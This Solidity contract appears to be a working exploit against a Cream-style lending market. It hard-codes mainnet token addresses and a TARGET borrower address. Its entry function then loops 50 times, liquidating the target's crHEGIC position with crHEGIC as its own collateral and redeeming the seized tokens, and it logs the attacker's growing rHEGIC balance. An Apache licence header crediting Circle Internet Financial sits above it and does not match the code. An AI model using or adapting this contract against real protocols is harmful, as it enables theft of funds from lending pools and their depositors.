/**
 * SPDX-License-Identifier: Apache-2.0
 *
 * Copyright (c) 2023, Circle Internet Financial, LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

pragma solidity 0.8.27;
import "hardhat/console.sol";

interface CTOKEN{
    function liquidateBorrow(address borrower, uint repayAmount, address cTokenCollateral) external returns (uint);
    function borrowBalanceStored(address account) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint); 
}

interface CT{
    function getAllMarkets() external view returns (address[] memory);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface ERC20{
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function withdraw( uint requestedAmount) external;
}

contract OO{
    address KNC = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
    address OM = 0x3593D125a4f7849a1B059E64F4517A86Dd60c95d;
    address COM = 0x11c70CAA910647d820bD014d676Dcd97EDD64A99;
    address CKNC = 0x180087A6a87Fd6b09a78C9b9B87b71335906c61D;
    address CZH = 0x0C91F1795e012BCEF586C925F747f23B0969B5eA;
    address ZH = 0x837010619aeb2AE24141605aFC8f66577f6fb2e7;
    address rHEGIC = 0x47C0aD2aE6c0Ed4bcf7bc5b380D7205E89436e84;
    address crHEGIC = 0xB15e13Bc622315E29A7142fea3d0c67464B44e97;
    address controller = 0x606246e9EF6C70DCb6CEE42136cd06D127E2B7C7;

    address TARGET = 0xe7E9EA373F253E71D12F6896785777A6a55189F4;

    function fuck() public{
        ERC20(rHEGIC).transferFrom(msg.sender, address(this), 60*1e18);
        ERC20(rHEGIC).approve(crHEGIC, type(uint256).max);
        console.log("start:",ERC20(rHEGIC).balanceOf(address(this)));
       for(uint i =0;i<50;i++){
            liqudate(i);
        }
        console.log("end:",ERC20(rHEGIC).balanceOf(address(this)));
       /* CTOKEN(crHEGIC).liquidateBorrow(TARGET, ERC20(rHEGIC).balanceOf(address(this)), COM);
        console.log("bba:",ERC20(COM).balanceOf(address(this)));
        CTOKEN(COM).redeem(ERC20(COM).balanceOf(address(this)));
        console.log("bbc:",ERC20(OM).balanceOf(address(this)));*/
    }

   /* function do(uint k) public{
        console.log("start:",ERC20(rHEGIC).balanceOf(address(this)));
       for(uint i =0;i<k;i++){
            liqudate(i);
        }
        console.log("end:",ERC20(rHEGIC).balanceOf(address(this)));
       /* CTOKEN(crHEGIC).liquidateBorrow(TARGET, ERC20(rHEGIC).balanceOf(address(this)), COM);
        console.log("bba:",ERC20(COM).balanceOf(address(this)));
        CTOKEN(COM).redeem(ERC20(COM).balanceOf(address(this)));
        console.log("bbc:",ERC20(OM).balanceOf(address(this)));
    }*/



    function liqudate(uint i) public{
        console.log("i",i);
        CTOKEN(crHEGIC).liquidateBorrow(TARGET, ERC20(rHEGIC).balanceOf(address(this)), crHEGIC);
        CTOKEN(crHEGIC).redeem(ERC20(crHEGIC).balanceOf(address(this)));
        console.log("rHEGIC:",ERC20(rHEGIC).balanceOf(address(this)));
    }

    receive() external payable { 

    }
}

